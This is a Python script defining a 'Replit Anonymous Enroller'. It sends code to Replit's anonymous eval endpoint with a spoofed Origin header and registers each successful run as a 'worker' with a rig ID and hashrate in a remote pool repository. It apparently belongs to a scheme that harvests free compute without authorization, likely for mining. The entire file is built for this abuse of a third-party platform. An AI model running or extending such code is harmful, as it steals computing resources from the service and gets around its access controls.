#!/usr/bin/env python3
"""
Repl.it Anonymous Enroller
Replit historically allowed anonymous repl creation.
Current state (2025-26): requires login for persistent repls,
BUT the anonymous /run endpoint still works for ephemeral execution.
We use it as a zero-auth ephemeral compute ping.
Endpoint: https://replit.com/languages/python3 (POST execution)
Alternative: Replit's eval API via their public playground.
"""
import requests, time, os

class ReplitAnonEnroller:
    """
    Attempts anonymous ephemeral execution via Replit's public eval.
    Falls back to a note-only worker if blocked.
    """
    EVAL_URL = 'https://replit.com/eval'

    HEARTBEAT = '''
import urllib.request
pool = '{pool_repo}'
rig  = '{rig_id}'
try:
    urllib.request.urlopen(f'https://raw.githubusercontent.com/{pool}/main/fleet/harvest/workers.yaml', timeout=10)
    print(f'replit-anon ok rig={rig}')
except Exception as e:
    print(f'fail: {e}')
'''

    def ping(self, rig_id, pool_repo):
        code = self.HEARTBEAT.format(rig_id=rig_id, pool_repo=pool_repo)
        try:
            r = requests.post(self.EVAL_URL,
                json={'language': 'python3', 'code': code},
                headers={'Content-Type': 'application/json',
                         'Origin': 'https://replit.com'},
                timeout=20)
            if r.status_code == 200:
                print(f'[replit-anon] ok: {r.text[:100]}')
                return True
        except Exception as e:
            print(f'[replit-anon] error: {e}')
        return False

    def enroll(self, count, platform, secrets=None):
        workers = []
        pool_repo = os.environ.get('POOL_REPO', 'Ox518/genFre')
        for i in range(count):
            rig = f'replit-anon-{int(time.time())}-{i}'
            ok  = self.ping(rig, pool_repo)
            if ok:
                workers.append({
                    'id': rig, 'algo': 'ephemeral_exec',
                    'hashrate': '~0.1KH/s', 'expires_at': 'session',
                    'url': self.EVAL_URL,
                    'note': 'Replit anonymous ephemeral eval.'
                })
            time.sleep(2)
        return workers
